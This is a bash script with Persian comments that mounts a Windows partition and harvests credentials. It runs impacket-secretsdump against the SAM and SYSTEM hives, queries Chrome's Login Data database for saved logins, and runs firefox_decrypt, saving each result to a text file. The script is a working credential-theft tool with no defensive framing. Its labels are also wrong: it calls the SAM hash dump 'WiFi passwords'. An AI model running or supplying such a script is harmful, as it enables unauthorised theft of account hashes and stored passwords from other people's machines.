#!/bin/bash

# متغیرها
MOUNT_POINT="/mnt/windows"
DEVICE=""
CHROME_PASSWORDS_FILE="chrome_passwords.txt"
FIREFOX_PASSWORDS_FILE="firefox_passwords.txt"
WIFI_PASSWORDS_FILE="wifi_passwords.txt"

# پیدا کردن پارتیشن ویندوز
echo "در حال پیدا کردن پارتیشن ویندوز..."
DEVICE=$(sudo fdisk -l | grep -i "Microsoft basic data" | awk '{print $1}')
if [ -z "$DEVICE" ]; then
    echo "پارتیشن ویندوز پیدا نشد. لطفاً دستگاه را به صورت دستی مشخص کنید."
    exit 1
fi
echo "پارتیشن ویندوز پیدا شد: $DEVICE"

# ایجاد دایرکتوری برای mount
sudo mkdir -p $MOUNT_POINT

# mount کردن پارتیشن ویندوز
echo "در حال mount کردن پارتیشن ویندوز..."
sudo mount $DEVICE $MOUNT_POINT
if [ $? -ne 0 ]; then
    echo "خطا در mount کردن پارتیشن ویندوز."
    exit 1
fi
echo "پارتیشن ویندوز با موفقیت mount شد."

# اجرای secretsdump
echo "در حال اجرای secretsdump..."
impacket-secretsdump -sam $MOUNT_POINT/Windows/System32/config/SAM -system $MOUNT_POINT/Windows/System32/config/SYSTEM LOCAL > $WIFI_PASSWORDS_FILE
if [ $? -ne 0 ]; then
    echo "خطا در اجرای secretsdump."
    exit 1
fi
echo "استخراج اطلاعات WiFi با موفقیت انجام شد. فایل $WIFI_PASSWORDS_FILE ایجاد شد."

# استخراج پسوردهای کروم
echo "در حال استخراج پسوردهای کروم..."
PROFILE_PATH="$HOME/.config/google-chrome/Default"
if [ -d "$PROFILE_PATH" ]; then
    sqlite3 $PROFILE_PATH/Login\ Data "SELECT origin_url, username_value, password_value FROM logins" > $CHROME_PASSWORDS_FILE
    if [ $? -ne 0 ]; then
        echo "خطا در استخراج پسوردهای کروم."
        exit 1
    fi
    echo "استخراج پسوردهای کروم با موفقیت انجام شد. فایل $CHROME_PASSWORDS_FILE ایجاد شد."
else
    echo "پروفایل کروم پیدا نشد."
fi

# استخراج پسوردهای فایرفاکس
echo "در حال استخراج پسوردهای فایرفاکس..."
firefox_decrypt > $FIREFOX_PASSWORDS_FILE
if [ $? -ne 0 ]; then
    echo "خطا در استخراج پسوردهای فایرفاکس."
    exit 1
fi
echo "استخراج پسوردهای فایرفاکس با موفقیت انجام شد. فایل $FIREFOX_PASSWORDS_FILE ایجاد شد."

# unmount کردن پارتیشن ویندوز
echo "در حال unmount کردن پارتیشن ویندوز..."
sudo umount $MOUNT_POINT
if [ $? -ne 0 ]; then
    echo "خطا در unmount کردن پارتیشن ویندوز."
    exit 1
fi
echo "پارتیشن ویندوز با موفقیت unmount شد."

echo "پایان عملیات."
